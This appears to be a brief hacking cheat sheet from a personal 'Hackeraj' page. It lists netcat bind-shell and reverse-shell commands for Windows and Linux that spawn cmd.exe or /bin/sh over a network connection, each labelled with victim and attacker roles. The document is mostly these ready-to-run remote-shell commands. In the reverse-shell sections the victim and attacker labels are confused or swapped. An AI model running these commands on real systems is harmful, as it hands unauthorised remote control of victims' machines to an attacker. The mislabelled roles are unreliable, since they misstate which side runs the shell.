# Netcat
Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. The command is designed to be a dependable back-end that can be used directly or easily driven by other programs and scripts.

## Netcat Bind Shell for windows Command
```
nc -lvp 4444 -e cmd.exe      (Victim as server)
nc -nv ip port               (attacker as client)
```
## Netcat Bind Shell for Linux Command
```
nc -lvp 4444 -e /bin/sh       (Victim as server)
nc -nv ip port                (attacker as client)
```
## Netcat Reverse Shell for windows Command
```
nc -lvp port                  (Victim as client)
nc -nv ip port -e cmd.exe     (attacker as server)
```
## Netcat Reverse Shell for Linux Command
```
nc -lvp port                 (Victim as server)
nc -nv ip port -e /bin/sh    (attacker as client)
```
[Facebook](https://www.facebook.com/Hackeraj/)
[Twitter](https://www.twitter.com/Hackeraj_np/)
[Instagram](https://www.instagram.com/Hackeraj/)
[Youtube](https://www.youtube.com/Hackeraj/)
